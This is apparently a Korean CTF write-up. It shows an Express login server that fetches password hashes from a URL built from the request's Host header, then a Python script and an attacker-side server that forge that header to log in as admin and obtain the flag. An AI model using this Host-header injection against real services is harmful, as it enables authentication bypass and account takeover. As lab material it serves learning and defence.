
# 키워드
- code odditing

# 주요 코드

```js
require('dotenv').config();
const express = require('express')
const cookieParser = require('cookie-parser')
const jwt = require('./util/jwt_utils')
const connection = require('./util/DB')
const axios = require('axios')
const crypto = require('crypto');

const app = express()
app.set("view engine", "ejs");
app.use(cookieParser())
app.use(express.json())
app.use(express.urlencoded({ extended: false }));
app.use(express.static('public'));
app.set('views', './public');

app.get('/', jwt.verify, (req, res) => {
	let flag = "Please Login"

	if(req.jwt.isLogin){
		if(req.jwt.idx=="admin") flag = process.env.FLAG
		else flag = "You are not admin."
		res.render('index', {isLogin: req.jwt.isLogin, name: req.jwt.idx, flag: flag})
	}
	else{
		res.render('index', {isLogin: req.jwt.isLogin, name: 'Anonymous', flag: flag})
	}
})

app.get('/login', (req, res) => {res.render('login')})
app.post('/login', async (req, res) => {
	const host = req.get('HOST')
	const id = req.body.id
	const password = req.body.password
	const url = encodeURI(`http://${host}/password/${id}`)

	const resp = await axios.get(url)

	if(resp.data === "User Does Not Exist") {
		res.write("<script>alert('please register')</script>")
		res.write("<script>window.location='/register'</script>")
		res.send()
	}
	else if(resp.data === "500 Error" || resp.data === undefined) 
	{
		res.send("SomeThind Error")
	}
	else if(resp.data === crypto.createHash('SHA256').update(password).digest('hex')) {
		const token = jwt.genarateAccessToken(id)
		res.cookie('token', token)
		res.redirect('/')
	}
	else {
		res.write("<script>alert('Incorrect Id or Password')</script>")
		res.write("<script>window.location='/login'</script>")
		res.send()
	}
})
app.get('/password/:id', async (req, res) => {
	const sql = "SELECT password FROM login WHERE id = ?"
	const values = [req.params.id]

	try {
		const [password] = await connection.execute(sql, values)
		if(password.length == 0) return res.send("User Does Not Exist")
		return res.send(password[0]['password'])
	} catch(err) {
		return res.send("500 Error")
	}
	
})
app.get('/register', (req, res) => {res.render('register')})
app.post('/register', async (req, res, next) => {
	const id = req.body.id
	const password = req.body.password

	const sql = "INSERT INTO login(id, password) VALUES(?, SHA2(?, 256))"
	const values = [id, password]

	try{
		await connection.execute(sql, values)
		res.write("<script>alert('Success to Register.\\nPlease Login.')</script>")
		res.write("<script>window.location='/login'</script>")
		res.send()
	}catch(err){
		if(err.code == "ER_DUP_ENTRY") {
			res.write("<script>alert('Id already exist.')</script>")
			res.write("<script>window.location='/register'</script>")
			res.send()
		}
		else if(err.code == "ER_DATA_TOO_LONG") {
			res.write("<script>alert('Id is too long.')</script>")
			res.write("<script>window.location='/register'</script>")
			res.send()
		}
		else {
			console.log(err)
			next(err)
		}
	}
})
app.get('/logout', (req, res) => {res.clearCookie('token'); res.redirect('/')})

app.use((err, req, res, next) => {
	console.error(err.stack)
	res.status(500).send("SomeThing Error");
})

app.listen(process.env.PORT);
```

# 풀이과정
- 해당 서버에서는 비밀번호 해시값을 받는 api를 통해 인증함
- 이를 통해 admin의 해심값을 얻어낼 수 있지만 sha256 해시값을 크랙하는건 사실상 불가능함
- 한편 서버 코드에 요청 패킷의 host필드를 참조하는 코드가 있는데, 서버 입장에서는 서버 내부 api를 통해 비밀번호 해시값을 가져오기를 기대함.
- 하지만 클라이언트는 이 정보를 위조할 수 있으므로 공격자 서버 주소를 host 필드에 넣어 조작된 해시값이 전달되게 위조할 수 있음
- 이를 통해 실제 admin의 비밀번호 정보 없이 토큰을 얻어 올 수 있음


- 요청 스크립트
```python
# import requests

# # 요청할 URL
# url = "http://3.34.189.239:8888/login"

# # POST 요청에 포함될 데이터
# data = {
#     "id": "admin",
#     "password": "asdf"
# }

# # 필요한 헤더만 지정
# headers = {
#     "Host": "211.250.216.249:3000",
#     "Content-Type": "application/x-www-form-urlencoded",
#     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
#     "Origin": "http://3.34.189.239:8888",
#     "Referer": "http://3.34.189.239:8888/login",
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
# }

# # POST 요청 보내기
# response = requests.post(url, data=data, headers=headers)

# # 응답 내용 출력
# print(response.status_code)
# print(response.text)


import http.client

# 서버의 IP와 포트를 설정합니다.
conn = http.client.HTTPConnection("3.34.189.239", 8888)

# 요청할 페이로드를 설정합니다.
payload = "id=admin&password=asdf"

# 필요한 헤더를 설정합니다.
headers = {
    "Host": "211.250.216.249:3000",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Origin": "http://3.34.189.239:8888",
    "Referer": "http://3.34.189.239:8888/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# POST 요청을 보냅니다.
conn.request("POST", "/login", payload, headers)

# 응답을 받습니다.
response = conn.getresponse()

# 응답 내용을 출력합니다.
print(response.status, response.reason)
print(response.read().decode())
print(response.getheader('Set-Cookie'))


```

- 공격 서버 스크립트
```js
const express = require("express");
const crypto = require("crypto");

const app = express();

//"asdf" -> f0e4c2f76c58916ec258f246851bea091d14d4247a2fc3e18694461b1816e13b
app.get("/password/admin", (req, res) => {
  const hash = crypto.createHash("SHA256").update("asdf").digest("hex");
  console.log(`signal in`);
  console.log(hash);
  res.send(hash);
});

const PORT = 3000; // HTTP 기본 포트
app.listen(PORT, () => {
  console.log(`Server running on http://211.250.216.249:${PORT}`);
});

```

- 콘솔에 출력된 쿠키를 이용해 플래그를 얻을 수 있음
![[스크린샷 2023-12-22 175306.png]]

# flag
![[스크린샷 2023-12-22 163616.png]]

